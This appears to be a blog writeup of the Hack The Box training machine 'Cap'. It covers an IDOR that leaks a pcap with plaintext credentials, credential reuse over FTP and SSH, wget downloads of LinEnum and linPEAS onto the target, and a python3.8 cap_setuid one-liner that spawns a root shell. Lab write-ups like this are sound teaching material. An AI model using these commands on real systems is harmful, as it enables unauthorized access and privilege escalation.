---
title: 'HTB Cap Writeup'
date: 2025-06-13
permalink: /posts/2025/06/HTB_Cap_Writeup/
tags:
  - HTB
  - writeup
  - easy
---

A writeup of the Hack The Box machine "Cap" with easy difficulty


HTB_Cap
======

Hello and welcome to this write up of the Hack the Box machine: Cap difficulty easy

<img src='/images/HTB_Cap/afbeelding.png'>

I start with a Nmap scan to see what ports are open and what services are running: `nmap -sV -sC 10.10.10.245`

<img src='/images/HTB_Cap/afbeelding 1.png'>

We see a ftp server with version 3.0.3, SSH and a http web page running on Gunicorn.

Going to this web page show us a dashboard with a page where we can download snapshot, IP config and Network status. 

<img src='/images/HTB_Cap/afbeelding 2.png'>

Lets see what happens when we click on Download: It downloads an empty pcap file. 

When downloading the file the url changed from /data/4 > data/6

When you change the number, you get scan results from someone else, for example /data/1:

<img src='/images/HTB_Cap/afbeelding 3.png'>

When downloading this pcap file, there is another source IP but nothing more interesting. Other numbers have no results except for 8. But this pcap file also contains no useful information. 

Also I noticed on the Network status page that port 33102 and 45094 are in use.

While exploring numbers behind the /data/ I forgot that I missed 0.

And yeah… pcap 0 contains sensitive information. A username and password can be seen.

Now we need to discover for what service this user is.

Earlier, we discovered that port 21 (ftp) is in use. Trying to login to this ftp server with the user and password:

<img src='/images/HTB_Cap/afbeelding 4.png'>

Yes, successful!

The user and password also works with SSH!

The next step is to run the privilege escalation script [LinEnum.sh](https://github.com/rebootuser/LinEnum.git)

To copy this file to the target machine, start a python server on your machine in the directory where the [LinEnum.sh](http://LinEnum.sh) file is located: `python3 -m http.server 8000` 

Now, on the target machine, download the script with: `wget http://10.10.14.1:8000/linenum.sh`  

To run this script, make the file executable with: `chmod +x LinEnum.sh` 

To run the file: `./LinEnum.sh`

Scanning through the results gets me nothing much what I noticed to be useful.

Also, I discovered that the nathan user is not in the sudoers file. When using the `sudo su -` command, you get this message.

Let’s try another privilege escalation: [linPEAS](https://github.com/peass-ng/PEASS-ng)

To download the script: 
`wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh` 

And execute the previous commands again on this script file.

Scanning through the results, in the File with capabilities section of the results: `/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip` 

<img src='/images/HTB_Cap/afbeelding 5.png'>

So the binary path /usr/bin/python3.8 has special capabilities that can be used to obtain root privileges. 

We can become root with the following command: 

`/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'`

And yess we have become root!

<img src='/images/HTB_Cap/afbeelding 6.png'>

The root flag is present in the /root directory.

<img src='/images/HTB_Cap/afbeelding 7.png'>

## Conclusion

Thank you for reading this writeup. Stay safe!